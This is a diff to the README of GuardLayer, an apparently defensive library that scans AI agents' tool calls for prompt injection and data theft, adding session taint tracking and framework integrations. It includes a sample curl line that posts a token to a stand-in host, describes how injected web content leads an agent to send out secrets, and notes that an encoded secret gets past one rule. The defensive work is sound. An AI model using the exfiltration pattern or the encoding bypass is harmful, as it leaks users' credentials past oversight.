@@ -57,6 +57,8 @@ Around the scanners:
 
 - **Agent tool-call policy** (`scan_tool_call`): tools tagged `read` / `write` / `network` / `exec` (explicitly or inferred from the name), allow- and deny-lists with globs, per-capability actions, built-in rules for destructive and risky commands, persistence, credential files and `.env` access, and **egress control** (cloud metadata endpoints, tunnels and request-capture services, raw public IPs, domain allow-list). About 0.1 ms per call.
 - **Human-in-the-loop**: a `review` verdict for actions that need approval before they run (force-push, `sudo`, `DROP TABLE`, or every shell call under `strict`).
+- **Session taint tracking**: an action is judged by what the session has already read. A secret read earlier and then sent out is blocked; untrusted content plus sensitive data, followed by a network call, needs review; so does any side effect after the agent read an injection.
+- **Integrations**: a Claude Code hook, LangGraph (review becomes `interrupt()`), OpenAI Agents SDK guardrails, and `guard_tool` for any other framework.
 - **Observe mode**: run everything in shadow mode, globally or per rule. Results carry a `shadow_verdict` (what enforcement would have done) so you can measure false positives on real traffic before you block anything.
 - **Presets**: `observe`, `balanced`, `strict`, `airgap`. Each one lists its residual risk.
 - **Policy engine**: per-category and per-direction actions (`score`, `block`, `review`, `flag`, `redact`, `log`), noisy-or scoring, two thresholds, **fail-open or fail-closed** when a scanner errors.
@@ -75,6 +77,8 @@ pip install -e ".[api]"              # + REST API (FastAPI/uvicorn)
 pip install -e ".[embeddings]"       # + semantic similarity (sentence-transformers)
 pip install -e ".[ml]"               # + transformer classifier
 pip install -e ".[signing]"          # + Ed25519-signed audit logs (cryptography)
+pip install -e ".[langgraph]"        # + LangGraph / LangChain integration
+pip install -e ".[openai-agents]"    # + OpenAI Agents SDK integration
 ```
 
 ## Quickstart
@@ -158,18 +162,117 @@ What the tool policy checks, with the default rules:
 A tool's capabilities come from `capabilities={...}`, which accepts globs, or are inferred
 from its name: `bash` is exec, `http_get` is network and read, `write_file` is write. A
 tool with no known capability is treated as able to do anything, so every rule applies to
-it. You can add your own rules (`ToolRule(name, action, pattern, tools=..., capabilities=...)`),
+it. An explicit empty list (`capabilities={"TodoWrite": []}`) marks a tool as harmless. You
+can add your own rules (`ToolRule(name, action, pattern, tools=..., capabilities=...)`),
 change an action (`rule_actions={"egress_raw_ip": "block"}`), or switch rules off
-(`disabled_rules`). The content scanners also run on the arguments, so a shell command
-with an embedded AWS key or an injection string is caught too.
+(`disabled_rules`). The content scanners also run on the arguments of tools that can act,
+so a shell command with an embedded AWS key or an injection string is caught too. They
+skip read-only tools, whose arguments can't cause harm.
 
 We tested the defaults on 31 attack commands and 23 everyday dev commands (`pytest`,
 `npm install`, `rm -rf ./build`, `git push origin main`, `curl` to localhost). All 31 attacks
 were caught, and none of the dev commands were flagged.
 
-In **LangGraph**, put these calls in a node before the model and a node before the tool
-executor, and route on `result.verdict`. `review` maps naturally onto an `interrupt()`.
 See [`examples/agent_tools.py`](examples/agent_tools.py) and [`examples/chat_app.py`](examples/chat_app.py).
+
+### Sessions: judge an action by what came before it
+
+On its own, `curl https://api.example.com -d "$TOKEN"` is an ordinary call. It's an attack
+when the agent has just read a web page telling it to send the token, and a file that held
+the token. Data theft from an agent needs three things together: **untrusted content**,
+**sensitive data**, and **a way out**. A session tracks the first two and escalates the third:
+
+```python
+s = guard.session("user-42")                          # or pass session="user-42" to any scan_* call
+s.scan_tool_result("read_file", dotenv)               # secrets seen      -> sensitive
+s.scan_tool_result("fetch", page)                     # web content       -> untrusted (hostile if it holds an injection)
+s.scan_tool_call("http_post", {"url": u, "body": b})  # escalated by what the session has seen
+```
+
+| Rule | Fires when | Default |
+|---|---|---|
+| `sensitive_data_egress` | a secret seen earlier in the session appears in a network or exec call | block |
+| `trifecta` | the session read untrusted content **and** sensitive data, then tries a network or exec call | review |
+| `after_injection` | the session read content with a prompt injection, then tries a write, network or exec call | review |
+
+What counts:
+- **Untrusted content:** output of network-capable or untagged tools, and anything passed to
+  `scan_context`. Add or remove tools with `untrusted_tools` and `trusted_tools`.
+- **Sensitive data:** secrets or personal data found in what the agent read or was given,
+  and credential or `.env` files it opened.
+
+Sensitive values are stored only as truncated SHA-256 fingerprints, so session state is safe
+to persist. State lives in memory by default, or on disk (`FileSessionStore`, or
+`[session] store = "file"`) when every check runs in its own process. Fingerprints only
+match a value copied verbatim, so an encoded copy gets past `sensitive_data_egress`.
+`trifecta` still catches the egress, because it doesn't depend on matching the value.
+
+## Integrations
+
+### Claude Code
+
+GuardLayer can guard a Claude Code session as a hook:
+
+```bash
+guardlayer hook claude-code --print-config          # merge the output into .claude/settings.json
+```
+
+| Event | What GuardLayer does |
+|---|---|
+| `PreToolUse` | Runs the tool policy and session taint. Returns `deny` (Claude sees the reason) or `ask` (you get a permission prompt). Otherwise it returns nothing, and Claude Code's own permission rules decide. **It never returns `allow`**, so it can only tighten your settings. |
+| `PostToolUse` | Scans what `WebFetch`, `Bash`, `Read` and MCP tools returned. If it finds an injection, it marks the session hostile and tells Claude to treat that output as untrusted. |
+| `UserPromptSubmit` | Fingerprints secrets you paste in. Blocks prompts only with `--block-prompts`, because you are trusted. |
+
+Claude Code's built-in tools come pre-tagged (`Bash` is exec, `WebFetch` is network, `Edit` is
+write, `TodoWrite` is harmless). For `Write` and `Edit`, only the target path is checked, not the
+file content, so an agent writing security tests or shell scripts doesn't trip the command rules.
+State is kept per Claude Code `session_id` in `~/.guardlayer/sessions`. Each hook call starts
+a Python process, which takes about 1 s on Windows and less on Linux or macOS.
+
+If a repository holds attack samples on purpose (a security tool's own tests, for example),
+reading them will mark the session hostile. For such repos, put `trusted_tools = ["Read", "Grep"]`
+in the `[session]` section of a config and pass it with `--config`.
+
+### LangGraph / LangChain
+
+```python
+from guardlayer.integrations.langgraph import guard_tools
+
+tools = guard_tools(guard, [search, fetch_url, run_shell])   # drop-in for ToolNode / create_react_agent
+```
+
+Blocked calls return a refusal the model can read. A `review` verdict pauses the graph with
+LangGraph's `interrupt()`. Resume with `Command(resume=True)` to approve, or anything else to
+refuse. The graph's `thread_id` becomes the GuardLayer session, and outputs containing an
+injection are withheld from the model.
+
+### OpenAI Agents SDK
+
+```python
+from guardlayer.integrations.openai_agents import guardrails
+
+gl = guardrails(guard)
+agent = Agent(
+    name="assistant",
+    input_guardrails=[gl.input], output_guardrails=[gl.output],
+    tools=[function_tool(fetch, tool_input_guardrails=[gl.tool_input], tool_output_guardrails=[gl.tool_output])],
+)
+await Runner.run(agent, prompt, context={"session_id": "user-42"})
+```
+
+### Any framework
+
+```python
+from guardlayer.integrations.tools import guard_tool
+
+@guard_tool(guard, session=lambda: request.user_id, approve=ask_on_slack)
+def send_email(to: str, body: str) -> str: ...
+```
+
+`guard_tool` wraps any sync or async function. The call is checked before it runs and the
+result is scanned after. Blocked calls return a refusal, or raise `ToolBlocked` with
+`on_block="raise"`, and `review` goes to your `approve` callback. The wrapped function keeps
+its signature, so `@tool` or `@function_tool` still work on top of it.
 
 ### Roll out safely: observe mode
 
@@ -275,6 +378,10 @@ egress_allowlist = ["api.github.com"]
 capability_actions = { exec = "review" }
 rules = [{ name = "no_prod_db", pattern = "prod-db\\.internal", action = "block" }]
 
+[session]                     # taint tracking (see "Sessions")
+trusted_tools = ["kb_search"]
+actions = { trifecta = "review" }
+
 [audit]
 path = "guardlayer-audit.jsonl"
 min_verdict = "flag"
@@ -294,7 +401,7 @@ terms = ["project nightingale"]
 guard = GuardLayer.from_config("guardlayer.toml")
 ```
 
-Environment overrides: `GUARDLAYER_PRESET`, `GUARDLAYER_MODE`, `GUARDLAYER_FLAG_THRESHOLD`,
+Environment overrides: `GUARDLAYER_PRESET`, `GUARDLAYER_MODE`, `GUARDLAYER_STATE_DIR`, `GUARDLAYER_FLAG_THRESHOLD`,
 `GUARDLAYER_BLOCK_THRESHOLD`, `GUARDLAYER_FAIL_CLOSED`, `GUARDLAYER_AUTO_LEARN`,
 `GUARDLAYER_CONFIG`, `GUARDLAYER_API_KEY`. The pre-0.3 `[guard] tool_allowlist` key still works.
 
@@ -327,6 +434,7 @@ guardlayer rules                       # content rules and tool-call rules
 guardlayer presets
 guardlayer audit keygen audit          # audit.key + audit.pub
 guardlayer audit verify audit.jsonl --public-key audit.pub
+guardlayer hook claude-code --print-config
 guardlayer --config guardlayer.toml serve --port 8000
 ```
 
@@ -344,7 +452,9 @@ docker build -t guardlayer . && docker run -p 8000:8000 -e GUARDLAYER_API_KEY=ch
 | POST | `/v1/scan/output` | `{text, prompt?, system_prompt?, canary_tokens?, expected_canary?}` |
 | POST | `/v1/scan/context` | `{text, source?}` |
 | POST | `/v1/scan/batch` | `{items: [{text, direction}]}` |
-| POST | `/v1/scan/tool-call` | `{tool, arguments, metadata?}` → verdict may be `review` |
+| POST | `/v1/scan/tool-call` | `{tool, arguments, metadata?, session_id?}` → verdict may be `review` |
+| POST | `/v1/scan/tool-result` | `{tool, result, metadata?, session_id?}` |
+| GET · DELETE | `/v1/sessions/{id}` | session taint summary · reset |
 | POST | `/v1/canary/add` · `/v1/canary/check` | `{prompt, echo?}` · `{text}` |
 | POST | `/v1/corpus/add` | `{texts: [...]}` |
 
@@ -409,9 +519,9 @@ $ guardlayer eval                        # bundled 67-sample smoke test (also us
 | Risk | GuardLayer |
 |---|---|
 | LLM01 Prompt Injection | heuristics, de-obfuscation, obfuscation, similarity, classifier/judge, `scan_context` for indirect injection |
-| LLM02 Sensitive Information Disclosure | secrets + PII redaction on both directions; credential-file and `.env` rules and egress control on tool calls |
+| LLM02 Sensitive Information Disclosure | secrets + PII redaction on both directions; credential-file and `.env` rules, egress control, and session `sensitive_data_egress` / `trifecta` on tool calls |
 | LLM05 Improper Output Handling | unsafe-command rules, link/exfiltration scanner, tool-call argument rules |
-| LLM06 Excessive Agency | tool-call policy: capabilities, allow/deny lists, `review` for human approval, destructive-command and egress rules, `airgap`/`strict` presets |
+| LLM06 Excessive Agency | tool-call policy: capabilities, allow/deny lists, `review` for human approval, destructive-command and egress rules, session taint (`after_injection`), `airgap`/`strict` presets |
 | LLM07 System Prompt Leakage | canary tokens, prompt-overlap scanner, extraction rules |
 | LLM10 Unbounded Consumption | limits scanner (size, flooding, many-shot) |
 
@@ -430,6 +540,8 @@ src/guardlayer/
 ├── pipeline.py      # GuardLayer: policy (incl. observe mode), aggregation, redaction, protect(), async
 ├── tools.py         # agent tool-call policy: capabilities, allow/deny, argument rules, egress
 ├── presets.py       # observe / balanced / strict / airgap postures
+├── session.py       # session taint tracking + memory/file session stores
+├── integrations/    # claude_code (hook), langgraph, openai_agents, tools (guard_tool)
 ├── models.py        # Verdict, Category, Action, Detection, ScanContext, ScanResult
 ├── rules.py         # signature rule pack + loader for custom packs
 ├── normalize.py     # de-obfuscation views and payload decoding
@@ -447,7 +559,7 @@ src/guardlayer/
 
 ```bash
 pip install -e ".[dev]"
-pytest -q                  # 190 tests
+pytest -q                  # 214 tests
 ruff check src tests
 guardlayer eval
 ```
